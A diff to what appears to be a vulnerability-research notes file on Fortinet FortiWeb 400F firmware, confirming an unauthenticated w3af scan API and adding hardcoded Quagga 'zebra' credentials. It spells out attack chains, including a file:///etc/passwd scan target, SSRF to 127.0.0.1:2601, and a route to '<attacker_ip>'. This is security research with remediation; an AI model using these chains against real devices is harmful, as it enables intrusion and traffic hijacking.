@@ -584,7 +584,15 @@ FWB_F09_WVS_NO_AUTH = {
         "local file disclosure from FortiWeb filesystem"
     ),
 
-    "blocker": "Cannot confirm at static analysis whether FortiWeb sets a WVS password at startup (startup scripts in encrypted rootfs); this remains CANDIDATE pending runtime confirmation",
+    "source_code_evidence": {
+        "file":     "wvs/.wvs-engine/w3af/core/ui/api/utils/auth.py lines 39-45",
+        "bypass":   "if not 'PASSWORD' in app.config: return f(*args, **kwargs)  # bypass -- no auth check",
+        "cli_flag": "'-p' password flag: required=False, default=False (cli.py process_cmd_args_config)",
+        "scans":    "POST /scans/ target_urls field accepts any URL; URL() constructor allows file://, http://, ftp://",
+    },
+    "status": "CONFIRMED -- source code in wvs.tar.xz confirms auth bypass when PASSWORD not in app.config; "
+              "password flag optional; file:// protocol accepted in scan targets",
+    "blocker": "Cannot confirm at static analysis whether FortiWeb sets a WVS password at startup (startup scripts in encrypted rootfs); runtime confirmation still required to assert exploitability",
 
     "remediation": "FortiWeb should always pass a randomly-generated SHA512 password hash to w3af_api at startup; bind w3af_api to a Unix domain socket instead of TCP loopback if feasible; restrict /scans/ to http(s) scheme targets only.",
 }
@@ -1046,7 +1054,13 @@ ANALYSIS_STATUS = {
         "FWB-F07: Shibboleth SP 2.x (EOL 2022) SAML config; same class as FAD-F10",
         "FortiWeb ships MCP schemas (2024-11-05 through 2025-11-25); MCP implementation in encrypted rootfs -- not yet analyzed",
         "FWB-F08: INFO -- FortiWeb MCP WAF proxy ships mcp_security_db.json v1.00010 (2025-09-15); 23 pattern groups; monitors tools/call+tools/list+prompts/get; GenericAPIKey pattern [A-Za-z0-9]{20,50} over-broad (matches JWTs/UUIDs/session tokens); WAF pattern bypass via encoding/Unicode normalization",
-        "FWB-F09: CANDIDATE -- wvs.tar.xz w3af REST API requires_auth bypasses all auth when PASSWORD not configured; POST /scans/ accepts file:// and internal targets -> local file read + SSRF; blocker: startup auth config in encrypted rootfs",
+        "FWB-F09: CONFIRMED -- wvs.tar.xz w3af REST API requires_auth (auth.py:43) returns immediately when PASSWORD not in app.config; "
+                 "'-p' password CLI flag is required=False default=False; URL() accepts file:// protocol; "
+                 "POST /scans/ target_urls=['file:///etc/passwd'] = local file read; chain: any SSRF to 127.0.0.1:5000",
+        "FWB-F21: MEDIUM -- rtmd.conf (Quagga routing daemon) hardcoded credentials password=zebra, enable_password=zebra; "
+                 "any loopback-reachable process authenticates to Quagga VTY (ports 2601/2602/2605); "
+                 "enable mode = routing table write, BGP session manipulation; "
+                 "chain: FWB-F09 SSRF -> localhost:2601 -> zebra password -> route hijack",
         "FWB-F10: LOW -- python-libs.tar.xz outdated packages: cryptography 37.0.2 (CVE-2023-49083/CVE-2024-26130 PKCS12 null deref, CVE-2023-0286 X.400 type confusion), ecdsa 0.17.0 (CVE-2024-23342 Minerva timing), Django 5.1.6 (CVE-2025-26115 admin XSS); pysqlcipher3 suggests encrypted secrets store; matplotlib unexpected in WAF firmware",
         "FortiWeb ships HSM (Luna/SafeNet) client config (Chrystoki.conf); HSM integration available but config has no credentials",
         "FFW-F05: CRITICAL -- etc/fgt2.key modulus A75C115F... identical to FGT 7.4.12 (FGT-F27), FGT 8.0.0, FGA 8.0.0; same static RSA key spans FortiGate and FortiWeb product lines across 7.4.x and 8.0.x release trains",
@@ -1432,6 +1446,68 @@ FWB_F20_400F_FIRMWARE_LAYOUT = {
         "body": "encrypted content after header+newline (32+ random-looking bytes)",
         "key":  "FWB_server_protection_KEY from signature_content_type.key (likely)",
     },
+}
+
+
+# ---------------------------------------------------------
+# FWB-F21: Quagga routing daemon hardcoded default credentials in rtmd.conf
+# Source: FWB_400F datafs/etc/rtmd.conf (unencrypted P2 partition)
+# ---------------------------------------------------------
+FWB_F21_QUAGGA_HARDCODED_CREDS = {
+    "id":       "FWB-F21",
+    "product":  "Fortinet FortiWeb 400F (FortiWeb OS 8.0.7.F) -- also confirmed in 8.0.6",
+    "severity": "MEDIUM -- Quagga/Zebra routing daemon (rtmd) ships with hardcoded default "
+                "credentials 'zebra'/'zebra'; any local process on the FortiWeb host can "
+                "telnet to 127.0.0.1:2601 (zebra), :2602 (bgpd), :2605 (bgpd vtysh) and "
+                "authenticate with the hardcoded password; enables routing table read/write",
+    "class":    "Hardcoded Credentials (CWE-798) in routing daemon",
+
+    "source_file": "datafs/etc/rtmd.conf",
+    "credentials": {
+        "password":        "zebra",
+        "enable_password": "zebra",
+        "hostname":        "FortiWeb",
+    },
+
+    "description": (
+        "/etc/rtmd.conf (Quagga RTM daemon config) contains default Quagga/Zebra credentials: "
+        "'password zebra' and 'enable password zebra'. "
+        "Quagga daemons (zebra, bgpd, ospfd, etc.) accept telnet connections on loopback ports "
+        "2601 (zebra), 2602 (bgpd), 2603 (ospfd), etc. "
+        "Any local process that can reach loopback -- including SSRF from FortiWeb web applications, "
+        "RCE from any other finding, or a legitimate process that is exploited -- can telnet to "
+        "localhost:2601 and authenticate with 'zebra'. "
+        "Authenticated access to Quagga CLI allows: "
+        "(1) read routing table (show ip route -- network topology disclosure); "
+        "(2) add/remove static routes (enable mode -- routing manipulation, traffic redirection); "
+        "(3) reconfigure BGP sessions if bgpd is active (BGP hijack from within FortiWeb). "
+        "Quagga 'enable password' grants full CLI write access (equivalent to enable mode in Cisco IOS). "
+        "The credentials are identical to Quagga's factory defaults and are shipped unmodified in firmware."
+    ),
+
+    "attack_chain": (
+        "FWB-F09 SSRF (w3af REST API unauthenticated scan) -> target_url='http://127.0.0.1:2601/' "
+        "(or Gopher protocol wrapper) -> Quagga telnet with 'zebra' password -> "
+        "enable mode with 'zebra' enable password -> 'ip route 0.0.0.0/0 <attacker_ip>' -> "
+        "all outbound FortiWeb traffic routed through attacker gateway"
+    ),
+
+    "chain_with": [
+        "FWB-F09: SSRF via w3af REST API -> loopback access -> Quagga telnet",
+        "FWB-F06: SSRF via Redis injection -> Quagga telnet",
+        "FWB-F11: WAD CAP_SYS_MODULE + Quagga route manipulation = post-RCE persistence",
+    ],
+
+    "remediation": (
+        "Replace hardcoded 'zebra' credentials with a randomly-generated password stored in "
+        "FortiWeb's encrypted keystore (not in plaintext rtmd.conf). "
+        "Bind Quagga daemons to Unix domain sockets instead of TCP loopback. "
+        "Apply 'no zebra vty' in zebra.conf to disable VTY entirely if FortiWeb uses Quagga "
+        "only as a library (not for interactive management)."
+    ),
+
+    "source": "rtmd.conf extracted from FWB_400F-v8.0.7.F-build0134-FORTINET.out datafs",
+    "status": "CONFIRMED -- credentials visible in plaintext in rtmd.conf",
 }
 
 
